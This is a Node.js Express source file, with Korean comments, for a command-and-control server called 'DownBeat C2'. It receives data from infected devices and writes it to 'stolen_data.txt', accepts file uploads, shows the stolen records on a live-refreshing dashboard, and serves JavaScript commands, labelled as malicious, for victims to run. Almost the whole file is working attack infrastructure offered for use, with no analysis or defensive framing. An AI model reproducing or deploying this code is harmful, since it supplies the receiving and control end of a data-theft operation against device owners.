const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');

// JSON 파싱
app.use(express.json());
app.use(express.text());

// CORS 허용 (중요!)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// 로그 파일 생성
const logFile = 'stolen_data.txt';

// 🔴 데이터 수집 엔드포인트
app.post('/collect', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toISOString();
    
    console.log(`\n🔴 [${timestamp}] 데이터 수신:`);
    console.log('Type:', data.type);
    console.log('Device:', data.device_id);
    console.log('Data:', data.data);
    
    // 파일에 저장
    const logEntry = `
========================================
시간: ${timestamp}
타입: ${data.type}
기기: ${data.device_id}
데이터: ${JSON.stringify(data.data, null, 2)}
========================================\n`;
    
    fs.appendFileSync(logFile, logEntry);
    
    res.json({ status: 'received' });
});

// 🔴 파일 업로드 엔드포인트
const multer = require('multer');
const upload = multer({ dest: 'uploads/' });

app.post('/upload', upload.single('file'), (req, res) => {
    console.log('📁 파일 업로드:', req.file);
    res.json({ status: 'uploaded' });
});

// 🔴 대시보드 (웹 인터페이스)
app.get('/dashboard', (req, res) => {
    const logs = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : '데이터 없음';
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🎯 DownBeat C2 Dashboard</title>
            <style>
                body {
                    background: #000;
                    color: #0F0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                }
                h1 {
                    color: #F00;
                    text-align: center;
                    animation: blink 1s infinite;
                }
                @keyframes blink {
                    50% { opacity: 0.5; }
                }
                .data-box {
                    background: #111;
                    border: 1px solid #0F0;
                    padding: 20px;
                    margin: 20px 0;
                    border-radius: 5px;
                    max-height: 500px;
                    overflow-y: auto;
                }
                pre {
                    white-space: pre-wrap;
                    word-wrap: break-word;
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 20px;
                    margin: 20px 0;
                }
                .stat-card {
                    background: #1a1a1a;
                    border: 1px solid #0F0;
                    padding: 15px;
                    text-align: center;
                }
                .refresh-btn {
                    background: #F00;
                    color: #FFF;
                    border: none;
                    padding: 10px 20px;
                    cursor: pointer;
                    font-size: 16px;
                }
            </style>
            <meta http-equiv="refresh" content="5">
        </head>
        <body>
            <h1>🎯 DOWNBEAT C&C DASHBOARD 🎯</h1>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>📱 연결된 기기</h3>
                    <p style="font-size: 24px;">1</p>
                </div>
                <div class="stat-card">
                    <h3>📊 수집된 데이터</h3>
                    <p style="font-size: 24px;">${logs.split('========').length - 1}</p>
                </div>
                <div class="stat-card">
                    <h3>⏰ 서버 상태</h3>
                    <p style="font-size: 24px; color: #0F0;">ONLINE</p>
                </div>
            </div>
            
            <button class="refresh-btn" onclick="location.reload()">🔄 새로고침</button>
            
            <div class="data-box">
                <h2>📥 실시간 로그</h2>
                <pre>${logs}</pre>
            </div>
        </body>
        </html>
    `);
});

// 🔴 명령 전송 엔드포인트 (C&C)
app.get('/commands', (req, res) => {
    // 악성 명령 전송
    const command = `
        alert('System Hacked!');
        // 추가 명령...
    `;
    res.send(command);
});

// 서버 시작
const PORT = 3000;
app.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════╗
║     🎯 DOWNBEAT C&C SERVER STARTED     ║
╠════════════════════════════════════════╣
║  Server Port: ${PORT}                        ║
║  Dashboard: http://localhost:${PORT}/dashboard ║
║  Waiting for connections...            ║
╚════════════════════════════════════════╝
    `);
});
